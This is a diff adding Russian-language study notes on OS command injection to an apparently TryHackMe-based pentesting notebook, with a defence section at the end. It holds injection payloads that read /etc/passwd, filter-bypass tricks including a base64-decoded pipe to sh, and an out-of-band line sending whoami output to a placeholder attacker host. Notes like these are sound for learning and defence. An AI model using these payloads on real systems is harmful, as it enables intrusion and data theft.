@@ -1489,3 +1489,56 @@ Playground: RFI
 - `display_errors = Off` в production.
 - Обновлять PHP.
 - WAF.
+
+#### Command Injection
+Суть
+Уязвимость, при которой пользовательский ввод попадает в системную команду без проверки. Позволяет выполнить произвольные команды ОС на сервере.
+Уязвимые функции
+- PHP: `exec()`, `system()`, `shell_exec()`, `passthru()`
+- Python: `subprocess.Popen(shell=True)`
+- Node.js: `child_process.exec()`
+
+Операторы оболочки
+| Оператор | Значение |
+|----------|----------|
+| `;` | Выполнить следующую команду всегда |
+| `&&` | Если первая успешна |
+| `\|\|` | Если первая провалилась |
+| `\|` | Pipe |
+| `&` | В фоне |
+| `$()` или `` ` `` | Подстановка вывода |
+
+Типы
+Verbose
+Вывод виден на странице.
+; whoami
+; ls -la
+; cat /etc/passwd
+; cat /home/tryhackme/flag.txt
+
+### Blind
+Вывод не виден. Используем:
+- **Time-based:** `; sleep 10`, `; ping -c 10 127.0.0.1`
+- **Redirection:** `; whoami > /var/www/html/output.txt` → открыть `http://target/output.txt`
+- **Out-of-band:** `; curl http://ATTACKER:8000/?d=$(whoami|base64)`
+
+Практика (лаба)
+1. Ввёл обычные данные, понял функционал (ping).
+2. Ввёл `; whoami` → получил имя пользователя (verbose).
+3. Ввёл `; cat /home/tryhackme/flag.txt` → флаг.
+
+Обход фильтров
+| Фильтр | Обход |
+|--------|-------|
+| Пробел | `${IFS}`, `%09`, `<` |
+| Спецсимволы | Hex-кодирование: `\x2f\x65\x74\x63` = `/etc` |
+| Ключевые слова | Base64: `echo L2V0Yy9wYXNzd2Q= \| base64 -d \| sh` |
+| Кавычки | `c"a"t /etc/passwd` |
+
+Защита
+- Whitelist значений (только цифры, только буквы).
+- `escapeshellarg()`, `escapeshellcmd()`.
+- Избегать `exec()`/`system()`/`passthru()` — использовать API.
+- Валидация на сервере (не только в HTML).
+- Принцип наименьших привилегий.
+- WAF.
